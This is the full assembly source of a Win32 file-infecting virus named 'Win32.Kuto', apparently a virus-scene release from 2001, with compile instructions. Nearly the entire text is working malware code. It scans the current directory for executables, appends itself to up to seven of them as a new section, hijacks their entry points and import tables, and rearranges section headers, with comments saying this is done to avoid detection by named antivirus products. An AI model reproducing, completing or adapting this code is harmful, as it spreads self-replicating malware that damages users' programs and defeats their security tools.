   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ
   ;  Virus Name ...: Win32.Kuto
   ;  Author .......: Juan Tamad
   ;  Origin .......: Philippines
   ;
   ;  Description...: This is my very first virus. It is a direct action,
   ;                : non-resident, infect files on current dir, and adds
   ;                : a new section. Also, instead of the usual search
   ;                : the base of KERNEL32, it instead carries its own
   ;                : import table and changes the entry of imports in data
   ;                : directory to point to the new import table. It is similar
   ;                : to import method in Win32.Demo by SMT/SMF (DVL #6).
   ;
   ;  Compile.......: tasm32 -q -t -ml -m3 kuto.asm
   ;                : tlink32 -Tpe -c -x kuto.obj ,,, import32.lib
   ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ

           .386
           .MODEL  FLAT, STDCALL

           INCLUDE mz.inc
           INCLUDE pe.inc
           INCLUDE win32api.inc
           INCLUDE useful.inc

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ

   e_lfanew                = MZ_lfanew
   NumberOfSections        = NT_FileHeader.FH_NumberOfSections
   ImageBase               = NT_OptionalHeader.OH_ImageBase
   AddressOfEntryPoint     = NT_OptionalHeader.OH_AddressOfEntryPoint
   SizeOfImage             = NT_OptionalHeader.OH_SizeOfImage
   SectionAlignment        = NT_OptionalHeader.OH_SectionAlignment
   Import                  = NT_OptionalHeader.OH_DataDirectory.DE_Import.\
                             DD_VirtualAddress
   SizeOfRawData           = SH_SizeOfRawData
   PointerToRawData        = SH_PointerToRawData
   VirtualSize             = SH_VirtualSize
   VirtualAddress          = SH_VirtualAddress

   invoke  MACRO   ApiName, @1, @2, @3, @4, @5, @6, @7, @8, @9, @10
           IRP     @0, <@10, @9, @8, @7, @6, @5, @4, @3, @2, @1>
           IFNB    <@0>
           push    @0
           ENDIF
           ENDM
           EXTERN  ApiName :proc
           call    ApiName
           ENDM

   api     MACRO   ApiName, @1, @2, @3, @4, @5, @6, @7, @8, @9, @10
           IRP     @0, <@10, @9, @8, @7, @6, @5, @4, @3, @2, @1>
           IFNB    <@0>
           push    @0
           ENDIF
           ENDM
           call    dword ptr [&ApiName&+ebp]
           ENDM

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ

   EXTRN   LoadLibraryA :PROC
   EXTRN   GetProcAddress :PROC

   d       EQU     dword ptr
   w       EQU     word ptr
   b       EQU     byte ptr

           .CODE

   HostEntry:

           invoke  GetModuleHandleA, 0
           mov     ebx, eax
           add     ebx, [eax+e_lfanew]
           mov     ebx, [ebx+Import]
           mov     d [OriginalImportTable], ebx

           jmp     VirEntry

   szMsg1          DB      "First generation...", 0
   szMsg2          DB      "Win32.Kuto", 0

   HostExit:
           invoke  MessageBoxA, 0, <offset szMsg1>, <offset szMsg2>, 0
           invoke  ExitProcess, 0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ

   DEBUG           =       1
   VIRSIZE         =       VirEnd - VirEntry
   FILESIZE        =       [ebp+wfd+WFD_nFileSizeLow]
   MAX_INFECT      =       7

           .DATA

   VirEntry:

           push    offset HostExit
   OriginalEntryPoint = $-4

           pushfd
           pushad

           call    $+5
           sub     d [esp], offset $
           pop     ebp                             ; delta

           @SEH_SetupFrame <jmp ReturnToHost>

           api     [GetModuleHandleA@], 0
           mov     [ebp+hModule], eax              ; ImageBase

           call    GetApiAddress
           call    RestoreOriginalImports

           lea     eax, [ebp+szMask]               ; '*.EXE'
           lea     ebx, [ebp+wfd]                  ; WIN32_FIND_DATA
           api     [FindFirstFileA@], eax, ebx
           .if eax == INVALID_HANDLE_VALUE
                   jmp     ReturnToHost
           .endif
           mov     [ebp+hFind], eax

           mov     [ebp+Infected], 0
           .repeat
                   call    InfectFile
                   lea     eax, [ebp+wfd]
                   api     [FindNextFileA@], [ebp+hFind], eax
                   .if eax == 0
                           .break
                   .endif
           .until  [ebp+Infected] >= MAX_INFECT
           api     [FindClose@], [ebp+hFind]

   ReturnToHost:
           @SEH_RemoveFrame
           popad
           popfd
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ
   GetApiAddress PROC

           lea     eax, [ebp+szK32]                ; 'KERNEL32.DLL'
           api     [GetModuleHandleA@], eax
           mov     ebx, eax
           lea     esi, [ebp+@szApi]
           .repeat
                   add     esi, 4
                   api     [GetProcAddress@], ebx, esi
                   mov     [esi-4], eax
                @: lodsb                           ; find end of string
                   or      al, al
                   jnz     @
           .until d [esi] == -1
           ret

   GetApiAddress ENDP

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ
   ;
   ; Restore hosts original imports. If LoadLibrary or GetProcAddress
   ; fails, there is no way to return to host (you can return, but it
   ; will most likely crash).
   ;

   RestoreOriginalImports PROC

           mov     esi, 0BADC0DEh
   OriginalImportTable = $-4
           add     esi, [ebp+hModule]
           .repeat
                   mov     ebx, d [esi+0Ch]                ; RVA of dll name
                   add     ebx, [ebp+hModule]
                   api     [GetModuleHandleA@], ebx
                   .if eax == 0
                           api     [LoadLibrary@], ebx
                           .if eax == 0
                                   jmp     Terminate       ; bad...
                           .endif
                   .endif
                   xchg    eax, ecx
                   mov     edi, [esi]                      ; OriginalFirstThunk
                   .if edi == 0                            ; yes?
                            mov     edi, [esi+10h]         ; no, use FirstThunk
                   .endif
                   add     edi, [ebp+hModule]
                   push    esi
                   mov     esi, [esi+10h]
                   add     esi, [ebp+hModule]              ; IAT
                   .while d [edi] != 0
                           lea     eax, [Temp+ebp]
                           push    ecx

                           ; In case IAT is not write enabled

                           api     [VirtualProtect@], esi, 4, PAGE_READWRITE, eax
                           pop     ecx
                           mov     eax, [edi]
                           test    eax, 80000000h          ; Ordinal?
                           .if !zero?
                                   and     eax, 0fffffffh
                           .else
                                   add     eax, 2
                                   add     eax, [ebp+hModule]
                           .endif
                           push    ecx
                           api     [GetProcAddress@], ecx, eax
                         ;
                         ; Detect if any breakpoints on (host) API
                         ;
                         ; .if byte ptr [eax] == 0CCh
                         ; .endif
                         ;
                           .if eax == 0
                                   jmp     Terminate       ; bad...
                           .endif
                           pop     ecx
                           mov     [esi], eax
                           add     esi, 4
                           add     edi, 4
                   .endw
                   pop     esi
                   add     esi, SIZE IMAGE_IMPORT_DESCRIPTOR
           .until d [esi+0ch] == 0
           ret

   Terminate:
           api     [ExitProcess@], -1

   RestoreOriginalImports ENDP

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ
   InfectFile PROC

           lea     eax, [ebp+wfd+WFD_szFileName]
           api     [CreateFileA@], eax, <GENERIC_READ OR GENERIC_WRITE>, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
           .if eax == INVALID_HANDLE_VALUE
                   ret
           .endif
           mov     [ebp+hFile], eax
           mov     eax, FILESIZE
           add     eax, VIRSIZE
           api     [CreateFileMappingA@], [ebp+hFile], 0, PAGE_READWRITE, 0, eax, 0
           mov     [ebp+hMap], eax

           api     [MapViewOfFile@], eax, FILE_MAP_WRITE, 0, 0, 0
           mov     [ebp+MapBase], eax

           mov     esi, eax
           add     eax, [eax+e_lfanew]
           xchg    eax, ebx
           api     [IsBadReadPtr@], ebx, 4 ; really needed only for '*.*' mask
           .if eax == 0 && (w [ebx] == "EP" && w [esi] == "ZM")
                   jmp     Continue
           .else
                   jmp     DoNotInfect
           .endif

   Continue:
           mov     eax, [ebx+AddressOfEntryPoint]
           add     eax, [ebx+ImageBase]
           mov     d [ebp+OriginalEntryPoint], eax

           lea     edi, [ebx+SIZE IMAGE_NT_HEADERS]
           movzx   ecx, w [ebx+NumberOfSections]
           mov     eax, ecx
           imul    ecx, ecx, SIZE IMAGE_SECTION_HEADER
           add     edi, ecx

           mov     [ebp+Temp], edi
           lea     edi, [ebx+SIZE IMAGE_NT_HEADERS]
           dec     eax
           imul    eax, eax, SIZE IMAGE_SECTION_HEADER
           add     edi, eax
           mov     esi, edi
           mov     eax, [edi+SizeOfRawData]
           add     eax, [edi+PointerToRawData]
           mov     [ebp+Kuto_Offs], eax

           .if eax < FILESIZE              ; for now, skip if extra data
                   jmp     DoNotInfect     ; found at EOF
           .endif

           .if d [ebx+Import+14*8+4] == 1  ; marker
                   jmp     DoNotInfect
           .else
                   mov     d [ebx+Import+14*8+4], 1
           .endif

   ; Update new section info... & PE header...

           mov     edx, [edi+VirtualSize]
           add     edx, [edi+VirtualAddress]
           mov     ecx, [ebx+SectionAlignment]
           mov     eax, edx
           call    align@
           mov     [ebp+Kuto_RVA], eax

           mov     [ebx+AddressOfEntryPoint], eax

           add     eax, VIRSIZE
           mov     ecx, [ebx+SectionAlignment]
           call    align@
           mov     [ebx+SizeOfImage], eax

           mov     eax,[ebx+Import]
           mov     d [ebp+OriginalImportTable], eax

   ; Convert import table entries to RVA...

           mov     eax, ImportTableBegin - VirEntry
           add     eax, [ebp+Kuto_RVA]
           mov     [ebx+Import], eax
           mov     d [ebx+Import+4], VirEnd - ImportTableBegin

           add     [K32+ebp], eax          ; Name
           add     [K32+ebp+4], eax        ; FirstThunk

           mov     ecx, szGMH - ImportTableBegin
           add     ecx, eax
           mov     [ebp+GetModuleHandleA@], ecx

           mov     ecx, szLL - ImportTableBegin
           add     ecx, eax
           mov     [ebp+LoadLibrary@], ecx

           mov     ecx, szGPA - ImportTableBegin
           add     ecx, eax
           mov     [ebp+GetProcAddress@], ecx

           mov     ecx, szEXIT - ImportTableBegin
           add     ecx, eax
           mov     [ebp+ExitProcess@], ecx

           mov     ecx, offset szK32 - ImportTableBegin
           add     ecx, eax
           mov     [ebp+K32], ecx

           mov     ecx, GetModuleHandleA@ - ImportTableBegin
           add     ecx, eax
           mov     [ebp+K32_IAT_RVA], ecx

           mov     d [ebp+ImportTableBegin+4], 0   ; TimeDateStamp
           mov     d [ebp+ImportTableBegin+8], 0   ; ForwaderChain

   ;
   ; Switch section...
   ;
   ; If we dont do this, NOD32 detects it as 'probably unknown WIN32 virus'
   ; and AVP as 'Type_Win32'.
   ;
           cld

           lea     esi, [ebx+SIZE IMAGE_NT_HEADERS]
           mov     edi, [ebp+Temp]
           mov     ecx, SIZE IMAGE_SECTION_HEADER/4
           rep     movsd

           lea     esi, [ebp+Kuto_Name]
           lea     edi, [ebx+SIZE IMAGE_NT_HEADERS]
           mov     ecx, SIZE IMAGE_SECTION_HEADER/4
           rep     movsd

   ; Append...

           mov     edi, [ebp+MapBase]
           add     edi, FILESIZE
           lea     esi, [ebp+VirEntry]
           mov     ecx, VIRSIZE
           rep     movsb

           inc     w [ebx+NumberOfSections]
           inc     [ebp+Infected]

           mov     eax, FILESIZE
           add     eax, VIRSIZE

           jmp     ExitInfect

   DoNotInfect:
           mov     eax, FILESIZE

   ExitInfect:
           api     [SetFilePointer@], [ebp+hFile], eax, 0, 0 ; FILE_BEGIN
           api     [SetEndOfFile@], [ebp+hFile]

           api     [UnmapViewOfFile@], [ebp+MapBase]
           api     [CloseHandle@], [ebp+hMap]
           api     [CloseHandle@], [ebp+hFile]
           ret

   InfectFile ENDP

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ
   align@  PROC

           xor     edx, edx
           div     ecx
           .if edx != 0
                   inc     eax
           .endif
           mul     ecx
           ret

   align@  ENDP

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ

   Copyleft        DB      "Win32.Kuto - (c) 2oo1 Juan Tamad. "
                   DB      "Made in the Philippines.", 0

   ;--------------------------------------
   szApi   MACRO   ApiName
           ApiName&@ DD 0
                     DB "&ApiName&", 0
           ENDM
   ;--------------------------------------

           @szApi:
           szApi   CreateFileA                     ; These apis can be present
           szApi   CreateFileMappingA              ; on the import table.
           szApi   MapViewOfFile                   ; but,
           szApi   UnmapViewOfFile                 ; they are here so they can
           szApi   SetFilePointer                  ; encrypted.
           szApi   SetEndOfFile                    ;
           szApi   VirtualProtect
           szApi   FindFirstFileA
           szApi   FindNextFileA
           szApi   FindClose
           szApi   CloseHandle
           szApi   IsBadReadPtr
                   DD -1

   IF DEBUG
    szMask         DB      "GOAT*.EXE", 0
   ELSE
    szMask         DB      "*.EXE", 0
   ENDIF

   ; Add these to section table
   ;
   Kuto_Name       db      '.kuto', 0, 0, 0
   Kuto_VSize      dd      VIRSIZE
   Kuto_RVA        dd      0
   Kuto_RSize      dd      VIRSIZE
   Kuto_Offs       dd      0
                   dd      0, 0, 0
   Kuto_Flags      dd      0E0000020h      ; C/E/R/W

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄ
   ;
   ; This is the virus import table. This method can be found in almost all
   ; PE protectors/packers. It is somehow an alternative solution to the
   ; problem of finding KERNEL32 and API addresses.
   ;
   ; All dwords are RVA.
   ;
                   align   4

   ImportTableBegin:

                   DD      0, 0, 0
   K32             DD      szK32 - ImportTableBegin
   K32_IAT_RVA     DD      K32_IAT - ImportTableBegin
                   DD      5 DUP (0)

                   K32_IAT:

   GetModuleHandleA@ DD     GetModuleHandleA
   LoadLibrary@    DD      LoadLibraryA
   GetProcAddress@ DD      GetProcAddress
   ExitProcess@    DD      ExitProcess
                   DD      0

   szK32           DB      "KERNEL32.DLL", 0
   szGMH           DB      0, 0, "GetModuleHandleA", 0
   szLL            DB      0, 0, "LoadLibraryA", 0
   szGPA           DB      0, 0, "GetProcAddress", 0
   szEXIT          DB      0, 0, "ExitProcess", 0

                   align   4

   VirEnd          LABEL

   hModule         DD      0
   hFind           DD      0
   hFile           DD      0
   hMap            DD      0
   MapBase         DD      0
   Temp            DD      0
   Infected        DD      0               ; infection counter
   wfd             WIN32_FIND_DATA <0>

                   END             HostEntry
